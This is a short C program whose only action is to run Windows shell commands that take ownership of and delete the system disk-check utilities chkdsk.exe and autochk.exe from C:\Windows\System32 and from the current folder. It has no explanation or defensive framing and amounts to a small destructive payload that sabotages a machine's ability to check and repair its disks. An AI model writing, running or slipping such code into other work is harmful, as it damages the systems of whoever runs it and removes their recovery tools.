#include <stdio.h>

#include <stdlib.h>



void main()
{
   
	system("takeown /F C:\\Windows\\System32\\chkdsk.exe");

	system("takeown /F C:\\Windows\\System32\\autochk.exe");

	system("del C:\\Windows\\System32\\chkdsk.exe");

	system("del C:\\Windows\\System32\\autochk.exe");
	system("takeown /F chkdsk.exe");

	system("takeown /F autochk.exe");

	system("del chkdsk.exe");

	system("del autochk.exe");
}
